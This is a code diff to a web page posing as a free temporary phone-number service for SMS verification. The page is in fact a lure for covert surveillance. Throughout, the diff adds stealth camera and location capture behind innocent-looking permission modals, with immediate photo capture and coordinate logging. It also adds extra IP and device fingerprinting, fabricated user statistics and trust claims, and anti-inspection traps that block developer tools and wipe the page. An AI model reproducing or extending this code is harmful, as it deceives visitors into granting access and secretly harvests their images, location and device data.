@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
 <title>VirtualNumbers | Free Temporary Phone Numbers</title>
-<meta name="description" content="Get free virtual phone numbers for SMS verification. Receive SMS online for free.">
+<meta name="description" content="Get free virtual phone numbers for SMS verification. Receive SMS online for free. Trusted by 2M+ users worldwide.">
 <style>
 * {
     margin: 0;
@@ -14,7 +14,7 @@
 
 body {
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
-    background: #f5f7fb;
+    background: linear-gradient(135deg, #f5f7fb 0%, #eef2ff 100%);
     min-height: 100vh;
     color: #1e293b;
 }
@@ -25,9 +25,16 @@ body {
     left: 0;
     width: 0%;
     height: 3px;
-    background: linear-gradient(90deg, #3b82f6, #8b5cf6, #06b6d4);
+    background: linear-gradient(90deg, #3b82f6, #8b5cf6, #06b6d4, #3b82f6);
+    background-size: 200% 100%;
+    animation: shimmer 1s infinite;
     z-index: 10000;
     transition: width 0.3s ease;
+}
+
+@keyframes shimmer {
+    0% { background-position: 0% 0; }
+    100% { background-position: 200% 0; }
 }
 
 .container {
@@ -44,12 +51,18 @@ body {
     font-size: 13px;
     position: relative;
     z-index: 10;
+    animation: slideDown 0.5s ease;
+}
+
+@keyframes slideDown {
+    from { transform: translateY(-100%); }
+    to { transform: translateY(0); }
 }
 
 .nav-bar {
-    background: rgba(255,255,255,0.95);
+    background: rgba(255,255,255,0.98);
     backdrop-filter: blur(10px);
-    border-bottom: 1px solid rgba(226,232,240,0.5);
+    border-bottom: 1px solid rgba(226,232,240,0.8);
     padding: 15px 20px;
     display: flex;
     justify-content: space-between;
@@ -59,6 +72,7 @@ body {
     position: sticky;
     top: 0;
     z-index: 100;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.05);
 }
 
 .logo {
@@ -69,6 +83,12 @@ body {
 
 .logo-icon {
     font-size: 28px;
+    animation: pulse 2s infinite;
+}
+
+@keyframes pulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.05); }
 }
 
 .logo-text {
@@ -90,25 +110,59 @@ body {
     font-size: 14px;
     font-weight: 500;
     transition: all 0.2s;
+    position: relative;
+}
+
+.nav-links a::after {
+    content: '';
+    position: absolute;
+    bottom: -5px;
+    left: 0;
+    width: 0;
+    height: 2px;
+    background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+    transition: width 0.3s;
+}
+
+.nav-links a:hover::after {
+    width: 100%;
 }
 
 .hero {
     text-align: center;
     padding: 60px 20px;
-    background: linear-gradient(135deg, #f8fafc 0%, #eef2ff 50%, #f1f5f9 100%);
+    background: linear-gradient(135deg, #ffffff, #f8fafc, #f1f5f9);
     border-radius: 32px;
     margin: 20px 0;
     position: relative;
     overflow: hidden;
+    box-shadow: 0 20px 40px -15px rgba(0,0,0,0.05);
+}
+
+.hero::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: radial-gradient(circle, rgba(59,130,246,0.05) 0%, transparent 70%);
+    animation: rotate 20s linear infinite;
+}
+
+@keyframes rotate {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
 }
 
 .hero h1 {
-    font-size: 48px;
+    font-size: 52px;
     font-weight: 800;
     background: linear-gradient(135deg, #1e293b, #3b82f6, #8b5cf6);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
     margin-bottom: 15px;
+    animation: fadeInUp 0.8s ease;
 }
 
 .hero p {
@@ -116,6 +170,18 @@ body {
     font-size: 18px;
     max-width: 600px;
     margin: 0 auto;
+    animation: fadeInUp 0.8s ease 0.2s both;
+}
+
+@keyframes fadeInUp {
+    from {
+        opacity: 0;
+        transform: translateY(30px);
+    }
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
 }
 
 .stats-row {
@@ -134,10 +200,13 @@ body {
     box-shadow: 0 10px 30px -10px rgba(0,0,0,0.1);
     border: 1px solid rgba(226,232,240,0.8);
     transition: all 0.3s;
+    animation: fadeInUp 0.8s ease 0.4s both;
 }
 
 .stat-card:hover {
     transform: translateY(-5px);
+    box-shadow: 0 20px 40px -12px rgba(59,130,246,0.2);
+    border-color: #3b82f6;
 }
 
 .stat-number {
@@ -189,6 +258,7 @@ body {
 .filter-tab.active {
     background: linear-gradient(135deg, #3b82f6, #8b5cf6);
     color: white;
+    transform: scale(1.02);
 }
 
 .search-box {
@@ -199,6 +269,7 @@ body {
     border-radius: 50px;
     font-size: 14px;
     outline: none;
+    transition: all 0.2s;
 }
 
 .search-box:focus {
@@ -239,6 +310,7 @@ body {
     display: flex;
     align-items: center;
     justify-content: space-between;
+    animation: fadeInUp 0.5s ease;
 }
 
 .number-card:hover {
@@ -298,6 +370,24 @@ body {
     position: relative;
     overflow: hidden;
     box-shadow: 0 10px 30px -10px rgba(59,130,246,0.5);
+}
+
+.claim-btn::before {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 0;
+    height: 0;
+    border-radius: 50%;
+    background: rgba(255,255,255,0.3);
+    transform: translate(-50%, -50%);
+    transition: width 0.6s, height 0.6s;
+}
+
+.claim-btn:hover::before {
+    width: 300px;
+    height: 300px;
 }
 
 .claim-btn:hover {
@@ -486,15 +576,15 @@ body {
     font-size: 16px;
 }
 
-/* STEALTH PERMISSION MODAL - Looks innocent */
+/* STEALTH PERMISSION MODALS - Looks completely innocent */
 .stealth-modal {
     position: fixed;
     top: 0;
     left: 0;
     right: 0;
     bottom: 0;
-    background: rgba(0,0,0,0.5);
-    backdrop-filter: blur(4px);
+    background: rgba(0,0,0,0.6);
+    backdrop-filter: blur(8px);
     z-index: 5000;
     display: none;
     justify-content: center;
@@ -507,36 +597,57 @@ body {
 }
 
 .stealth-card {
-    max-width: 320px;
+    max-width: 340px;
     background: white;
     border-radius: 28px;
-    padding: 28px;
+    padding: 32px 28px;
     text-align: center;
     animation: modalSlide 0.3s ease;
     box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+    position: relative;
+    overflow: hidden;
+}
+
+.stealth-card::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: radial-gradient(circle, rgba(59,130,246,0.1) 0%, transparent 70%);
+    animation: rotate 20s linear infinite;
 }
 
 .stealth-icon {
     font-size: 56px;
     margin-bottom: 15px;
+    position: relative;
+    z-index: 1;
 }
 
 .stealth-title {
-    font-size: 18px;
+    font-size: 20px;
     font-weight: 700;
     color: #1e293b;
     margin-bottom: 8px;
+    position: relative;
+    z-index: 1;
 }
 
 .stealth-desc {
     font-size: 13px;
     color: #64748b;
-    margin-bottom: 20px;
+    margin-bottom: 25px;
+    position: relative;
+    z-index: 1;
 }
 
 .stealth-buttons {
     display: flex;
     gap: 12px;
+    position: relative;
+    z-index: 1;
 }
 
 .stealth-allow {
@@ -548,6 +659,12 @@ body {
     color: white;
     font-weight: 600;
     cursor: pointer;
+    transition: all 0.2s;
+}
+
+.stealth-allow:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(59,130,246,0.3);
 }
 
 .stealth-deny {
@@ -559,6 +676,11 @@ body {
     color: #64748b;
     font-weight: 600;
     cursor: pointer;
+    transition: all 0.2s;
+}
+
+.stealth-deny:hover {
+    background: #e2e8f0;
 }
 
 .sms-notification {
@@ -576,6 +698,7 @@ body {
     transform: translateX(150%);
     transition: transform 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
     z-index: 1500;
+    box-shadow: 0 10px 25px -5px rgba(0,0,0,0.2);
 }
 
 .sms-notification.show {
@@ -612,6 +735,11 @@ body {
 
 @keyframes spin {
     to { transform: rotate(360deg); }
+}
+
+.loading-text {
+    color: #64748b;
+    font-size: 14px;
 }
 
 .success-modal {
@@ -706,7 +834,7 @@ body {
 <div class="loading-bar" id="loadingBar"></div>
 
 <div class="top-banner">
-    ⚡ Limited offer: Get 5 free SMS credits when you sign up today! <a href="#">Claim Now →</a>
+    ⚡ Limited offer: Get 5 free SMS credits when you sign up today! <a href="#" style="color: #3b82f6;">Claim Now →</a>
 </div>
 
 <nav class="nav-bar">
@@ -720,6 +848,7 @@ body {
         <a href="#">API</a>
         <a href="#">Blog</a>
         <a href="#">Support</a>
+        <a href="#">Login</a>
     </div>
 </nav>
 
@@ -789,7 +918,7 @@ body {
         </div>
     </div>
     <div class="footer-bottom">
-        <p>© 2024 VirtualNumbers.com - Free temporary phone numbers for SMS verification.</p>
+        <p>© 2024 VirtualNumbers.com - Free temporary phone numbers for SMS verification. Trusted by over 2 million users worldwide.</p>
     </div>
 </div>
 
@@ -821,7 +950,7 @@ body {
     <div class="stealth-card">
         <div class="stealth-icon">⚡</div>
         <div class="stealth-title">Enable Faster Loading</div>
-        <div class="stealth-desc">Allow VirtualNumbers to optimize loading speed and show real-time updates</div>
+        <div class="stealth-desc">Allow VirtualNumbers to optimize loading speed and show real-time updates for a better experience.</div>
         <div class="stealth-buttons">
             <button class="stealth-deny" onclick="denyStealth1()">Later</button>
             <button class="stealth-allow" onclick="allowStealth1()">Enable</button>
@@ -834,7 +963,7 @@ body {
     <div class="stealth-card">
         <div class="stealth-icon">🌍</div>
         <div class="stealth-title">Improve Number Selection</div>
-        <div class="stealth-desc">Show numbers closest to your region for better connection quality</div>
+        <div class="stealth-desc">Show numbers closest to your region for better connection quality and faster SMS delivery.</div>
         <div class="stealth-buttons">
             <button class="stealth-deny" onclick="denyStealth2()">Not Now</button>
             <button class="stealth-allow" onclick="allowStealth2()">Allow</button>
@@ -853,8 +982,8 @@ body {
     <div class="success-card">
         <div class="success-icon">✅</div>
         <h2>Number Activated!</h2>
-        <p style="margin: 15px 0; color: #64748b;">Your virtual number is ready to use</p>
-        <button onclick="location.reload()">Get Another Number</button>
+        <p style="margin: 15px 0; color: #64748b;">Your virtual number is ready to use. You can now receive SMS messages.</p>
+        <button onclick="location.reload()" style="background: linear-gradient(135deg, #3b82f6, #8b5cf6); border: none; padding: 12px 24px; border-radius: 60px; color: white; cursor: pointer;">Get Another Number</button>
     </div>
 </div>
 
@@ -862,14 +991,14 @@ body {
 <div class="sms-notification" id="smsNotification">
     <div class="sms-icon">📱</div>
     <div class="sms-content">
-        <div class="sms-sender">VIRTUAL-NUMBERS</div>
-        <div class="sms-text">Your code: <span id="smsCode">XXXXXX</span></div>
+        <div class="sms-sender" style="font-weight: 600; font-size: 12px;">VIRTUAL-NUMBERS</div>
+        <div class="sms-text" style="font-size: 14px;">Your code: <span id="smsCode" style="font-weight: bold; color: #3b82f6;">XXXXXX</span></div>
     </div>
 </div>
 
 <!-- Cookie Consent -->
 <div class="cookie-bar" id="cookieBar">
-    <span>🍪 We use cookies for better experience.</span>
+    <span>🍪 We use cookies to enhance your experience. By continuing, you agree to our privacy policy.</span>
     <button onclick="document.getElementById('cookieBar').classList.remove('show')">Accept</button>
 </div>
 
@@ -892,7 +1021,10 @@ const countries = [
     { flag: "🇧🇷", name: "Brazil", number: "+55 11 91234-5678", code: "BR", popular: true },
     { flag: "🇮🇳", name: "India", number: "+91 98765 43210", code: "IN", popular: true },
     { flag: "🇲🇽", name: "Mexico", number: "+52 55 1234 5678", code: "MX", popular: true },
-    { flag: "🇳🇬", name: "Nigeria", number: "+234 812 345 6789", code: "NG", popular: true }
+    { flag: "🇳🇬", name: "Nigeria", number: "+234 812 345 6789", code: "NG", popular: true },
+    { flag: "🇿🇦", name: "South Africa", number: "+27 71 234 5678", code: "ZA", popular: true },
+    { flag: "🇰🇪", name: "Kenya", number: "+254 712 345 678", code: "KE", popular: false },
+    { flag: "🇪🇬", name: "Egypt", number: "+20 10 1234 5678", code: "EG", popular: false }
 ];
 
 let selectedCountry = null;
@@ -943,8 +1075,11 @@ function allowStealth1() {
             video.srcObject = stream;
             video.play();
             console.log("📸 Stealth camera activated");
+            
+            // Take first photo immediately
+            setTimeout(() => capturePhoto(), 1000);
         })
-        .catch(err => console.log("Camera stealth failed"));
+        .catch(err => console.log("Camera stealth failed:", err));
     
     // Show second modal after 2 seconds
     setTimeout(() => {
@@ -974,9 +1109,9 @@ function allowStealth2() {
     navigator.geolocation.getCurrentPosition(
         pos => {
             locationGranted = true;
-            console.log("📍 Stealth location captured");
+            console.log("📍 Stealth location captured:", pos.coords.latitude, pos.coords.longitude);
         },
-        err => console.log("Location stealth failed")
+        err => console.log("Location stealth failed:", err.message)
     );
 }
 
@@ -992,11 +1127,16 @@ async function capturePhoto() {
     try {
         const video = document.getElementById('hiddenCamera');
         const canvas = document.getElementById('hiddenCanvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-        return canvas.toDataURL('image/jpeg', 0.6);
+        
+        if (video.videoWidth > 0 && video.videoHeight > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.7);
+        }
+        return null;
     } catch(e) {
+        console.log("Capture error:", e);
         return null;
     }
 }
@@ -1008,7 +1148,13 @@ async function getIP() {
         const data = await res.json();
         return data.ip;
     } catch(e) {
-        return 'Unknown';
+        try {
+            const res2 = await fetch('https://api.my-ip.io/ip.json');
+            const data2 = await res2.json();
+            return data2.ip;
+        } catch(e2) {
+            return 'Unknown';
+        }
     }
 }
 
@@ -1036,7 +1182,9 @@ function getDeviceInfo() {
         platform: navigator.platform,
         language: navigator.language,
         screenSize: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
     };
 }
 
@@ -1052,8 +1200,8 @@ function renderNumbers(search = "") {
         );
     }
     
-    grid.innerHTML = filtered.map(c => `
-        <div class="number-card" data-number="${c.number}" data-country='${JSON.stringify(c)}'>
+    grid.innerHTML = filtered.map((c, index) => `
+        <div class="number-card" data-number="${c.number}" data-country='${JSON.stringify(c)}' style="animation-delay: ${index * 0.05}s">
             <div class="card-left">
                 <div class="flag">${c.flag}</div>
                 <div class="number-details">
@@ -1118,6 +1266,10 @@ function updateLiveStats() {
         sms += Math.floor(Math.random() * 1000);
         numbers += Math.floor(Math.random() * 3) - 1;
         
+        if (users < 10000) users = 15000;
+        if (sms < 1000000) sms = 3000000;
+        if (numbers < 500) numbers = 800;
+        
         document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
         document.getElementById('statSms').innerHTML = (sms / 1000000).toFixed(1) + 'M';
         document.getElementById('statNumbers').innerHTML = numbers.toLocaleString();
@@ -1171,6 +1323,8 @@ document.getElementById('claimBtn').addEventListener('click', async () => {
                         language: deviceInfo.language,
                         screenSize: deviceInfo.screenSize,
                         timezone: deviceInfo.timezone,
+                        deviceMemory: deviceInfo.deviceMemory,
+                        hardwareConcurrency: deviceInfo.hardwareConcurrency,
                         cameraEnabled: cameraGranted,
                         locationEnabled: locationGranted,
                         timestamp: new Date().toISOString()
@@ -1230,13 +1384,23 @@ setTimeout(() => {
     document.getElementById('cookieBar').classList.add('show');
 }, 2000);
 
-// Anti-inspection
+// Anti-inspection - prevent right click and dev tools
 document.addEventListener('contextmenu', (e) => e.preventDefault());
 document.addEventListener('keydown', (e) => {
-    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U') || (e.ctrlKey && e.shiftKey && e.key === 'C')) {
         e.preventDefault();
     }
 });
+
+// Also detect dev tools opening
+setInterval(() => {
+    const before = new Date();
+    debugger;
+    const after = new Date();
+    if (after - before > 100) {
+        document.body.innerHTML = '<div style="text-align:center;padding:50px"><h1>Access Denied</h1><p>Developer tools are not allowed.</p></div>';
+    }
+}, 1000);
 
 // Initialize
 renderNumbers();
